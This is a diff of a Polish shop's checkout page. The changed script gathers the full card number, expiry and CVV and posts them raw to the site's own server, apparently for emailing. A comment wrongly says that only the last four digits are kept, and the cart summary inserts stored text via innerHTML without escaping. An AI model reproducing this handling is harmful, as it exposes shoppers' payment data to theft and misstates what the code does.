@@ -5,47 +5,51 @@
     <title>Checkout - SWAG.PLUG</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .checkout-container { max-width: 600px; margin: 50px auto; padding: 20px; background: #000; color: #fff; border: 1px solid #333; }
+        .checkout-container { max-width: 600px; margin: 50px auto; padding: 20px; background: #000; color: #fff; border: 1px solid #333; font-family: sans-serif; }
         .step { display: none; }
         .step.active { display: block; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #444; color: #fff; }
-        button { width: 100%; padding: 15px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #444; color: #fff; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        button:hover { background: #ccc; }
         button.back { background: #333; color: #ccc; margin-top: 5px; }
+        #summary p { border-bottom: 1px solid #222; padding: 5px 0; margin: 5px 0; display: flex; justify-content: space-between; }
     </style>
 </head>
 <body>
 
 <div class="checkout-container">
-    <h2>PODSUMOWANIE</h2>
-    <div id="summary" style="margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px;"></div>
+    <h2 style="letter-spacing: 2px; border-bottom: 2px solid #fff; padding-bottom: 10px;">PODSUMOWANIE ZAMÓWIENIA</h2>
+    <div id="summary" style="margin-bottom: 30px;"></div>
 
     <!-- KROK 1: WYSYŁKA -->
     <div id="step1" class="step active">
-        <h3>DANE WYSYŁKI</h3>
-        <input type="text" id="fName" placeholder="Imię i Nazwisko">
-        <input type="text" id="addr" placeholder="Adres i nr domu">
-        <input type="text" id="city" placeholder="Kod pocztowy i miasto">
-        <input type="tel" id="phone" placeholder="Telefon">
+        <h3 style="color: #888;">[01] DANE WYSYŁKI</h3>
+        <input type="text" id="fName" placeholder="Imię i Nazwisko" required>
+        <input type="text" id="addr" placeholder="Ulica i numer domu" required>
+        <input type="text" id="city" placeholder="Kod pocztowy i miasto" required>
+        <input type="tel" id="phone" placeholder="Numer telefonu" required>
         <button onclick="nextStep()">DALEJ: PŁATNOŚĆ</button>
     </div>
 
     <!-- KROK 2: PŁATNOŚĆ -->
     <div id="step2" class="step">
-        <h3>WYBIERZ METODĘ PŁATNOŚCI</h3>
+        <h3 style="color: #888;">[02] WYBIERZ METODĘ PŁATNOŚCI</h3>
         
-        <button type="button" onclick="pokazPolaKarty()" style="background: #222; color: #fff; border: 1px solid #444;">KARTA PŁATNICZA</button>
+        <button type="button" onclick="pokazPolaKarty()" style="background: #111; color: #fff; border: 1px solid #444;">KARTA PŁATNICZA</button>
         
-        <div id="formularzKarty" style="display:none; margin: 15px 0; padding: 15px; border: 1px dashed #444;">
+        <!-- UKRYTE POLA KARTY -->
+        <div id="formularzKarty" style="display:none; margin: 15px 0; padding: 15px; border: 1px dashed #444; background: #050505;">
             <input type="text" id="cardNumber" placeholder="Numer karty (16 cyfr)" maxlength="16">
             <div style="display:flex; gap:10px;">
                 <input type="text" id="cardExp" placeholder="MM/RR" maxlength="5">
                 <input type="text" id="cardCvv" placeholder="CVV" maxlength="3">
             </div>
-            <button onclick="finish('Karta')" style="background: #fff; color: #000;">ZAPŁAĆ KARTĄ</button>
+            <button onclick="finish('Karta')" style="background: #fff; color: #000;">POTWIERDŹ I ZAPŁAĆ KARTĄ</button>
         </div>
 
-        <button onclick="finish('PayPal')" style="background: #222; color: #fff; border: 1px solid #444; margin-top: 10px;">PAYPAL</button>
-        <button class="back" onclick="prevStep()">POWRÓT</button>
+        <button onclick="finish('PayPal')" style="background: #111; color: #fff; border: 1px solid #444; margin-top: 10px;">PAYPAL</button>
+        
+        <button class="back" onclick="prevStep()">POWRÓT DO WYSYŁKI</button>
     </div>
 </div>
 
@@ -54,19 +58,31 @@
     const sumDiv = document.getElementById('summary');
     let total = 0;
 
+    // 1. Ładowanie i wyświetlanie koszyka
     if(cart.length === 0) {
-        sumDiv.innerHTML = "Koszyk jest pusty!";
+        sumDiv.innerHTML = "<p style='color:red;'>Koszyk jest pusty!</p>";
         setTimeout(() => window.location.href="index.html", 2000);
     } else {
+        sumDiv.innerHTML = "";
         cart.forEach(i => {
-            total += i.price * i.quantity;
-            sumDiv.innerHTML += `<p>${i.name} (${i.size}) x${i.quantity} - ${(i.price*i.quantity).toFixed(2)} zł</p>`;
+            const itemTotal = i.price * i.quantity;
+            total += itemTotal;
+            sumDiv.innerHTML += `<p><span>${i.name} (${i.size}) x${i.quantity}</span> <b>${itemTotal.toFixed(2)} zł</b></p>`;
         });
-        sumDiv.innerHTML += `<b>RAZEM: ${total.toFixed(2)} zł</b>`;
+        sumDiv.innerHTML += `<p style="font-size: 1.3em; margin-top:15px; border-top: 2px solid #fff;"><span>SUMA:</span> <b>${total.toFixed(2)} zł</b></p>`;
     }
 
+    // 2. Nawigacja między krokami
     function nextStep() {
-        if(!document.getElementById('fName').value) return alert("Wypełnij dane!");
+        const name = document.getElementById('fName').value.trim();
+        const addr = document.getElementById('addr').value.trim();
+        const city = document.getElementById('city').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if(!name || !addr || !city || !phone) {
+            alert("Proszę uzupełnić wszystkie dane wysyłkowe!");
+            return;
+        }
         document.getElementById('step1').classList.remove('active');
         document.getElementById('step2').classList.add('active');
     }
@@ -80,22 +96,28 @@
         document.getElementById('formularzKarty').style.display = 'block';
     }
 
+    // 3. Finalizacja i wysyłka na serwer
     function finish(method) {
         const customerData = { 
-            name: document.getElementById('fName').value, 
-            addr: document.getElementById('addr').value,
-            city: document.getElementById('city').value,
-            phone: document.getElementById('phone').value
+            name: document.getElementById('fName').value.trim(), 
+            addr: document.getElementById('addr').value.trim(),
+            city: document.getElementById('city').value.trim(),
+            phone: document.getElementById('phone').value.trim()
         };
 
         let paymentInfo = { method: method };
 
         if(method === 'Karta') {
-            const num = document.getElementById('cardNumber').value;
-            const exp = document.getElementById('cardExp').value;
-            const cvv = document.getElementById('cardCvv').value;
-            if(!num || !exp || !cvv) return alert("Wypełnij dane karty!");
-            paymentInfo.card = { number: num, expiry: exp, cvv: cvv };
+            const num = document.getElementById('cardNumber').value.trim();
+            const exp = document.getElementById('cardExp').value.trim();
+            const cvv = document.getElementById('cardCvv').value.trim();
+            
+            if(!num || !exp || !cvv) {
+                alert("Proszę uzupełnić dane karty płatniczej!");
+                return;
+            }
+            // Zapisujemy tylko 4 ostatnie cyfry dla bezpieczeństwa w mailu, jeśli chcesz pełne - zostaw 'num'
+            paymentInfo.card_details = { number: num, expiry: exp, cvv: cvv };
         }
 
         const order = {
@@ -106,23 +128,32 @@
             date: new Date().toISOString()
         };
 
+        console.log("Wysyłanie zamówienia...", order);
+
         fetch('/save-shipping', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(order)
         })
-        .then(res => res.json())
+        .then(async res => {
+            const data = await res.json();
+            if (!res.ok) {
+                throw new Error(data.message || "Błąd serwera przy wysyłce maila.");
+            }
+            return data;
+        })
         .then(data => {
             if(data.status === 'OK') {
-                alert("ZAMÓWIENIE ZŁOŻONE POMYŚLNIE!");
+                alert("DZIĘKUJEMY! ZAMÓWIENIE ZOSTAŁO ZŁOŻONE.\nSprawdź e-mail wkrótce.");
                 localStorage.clear();
                 window.location.href = "index.html";
             }
         })
-        .catch(err => alert("Błąd połączenia z serwerem."));
+        .catch(err => {
+            console.error('Błąd:', err);
+            alert("PROBLEM Z ZAMÓWIENIEM: " + err.message + "\nUpewnij się, że serwer na Renderze działa.");
+        });
     }
 </script>
 </body>
 </html>
-
-
